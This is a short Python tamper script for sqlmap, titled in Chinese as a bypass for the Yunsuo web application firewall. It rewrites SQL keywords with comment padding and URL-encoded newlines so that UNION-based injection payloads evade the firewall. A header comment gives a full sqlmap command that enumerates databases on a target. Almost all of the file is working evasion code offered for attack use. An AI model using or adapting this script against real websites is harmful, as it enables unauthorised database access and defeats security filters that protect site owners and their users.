#Sqlmap绕云锁脚本.py

# sqlmap.py -u http://<HOST>:<PORT>/?id=1 --batch --purge --random-agent --technique=U --no-cast --tamper=0_safedog.py --dbs

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):

    payload = payload.replace('order','group%23%0a')
    payload = payload.replace('select','/*88888xxx*/select')
    payload = payload.replace('union', '%23%0a/*88888xxx*/union/*88888xxx*/')
    payload = payload.replace('by', '/*88888xxx*/by/*88888xxx*/')
    payload = payload.replace('group_concat(', 'group_concat(%0a')
    payload = payload.replace('?id=1', '?id=--1')

    return payload

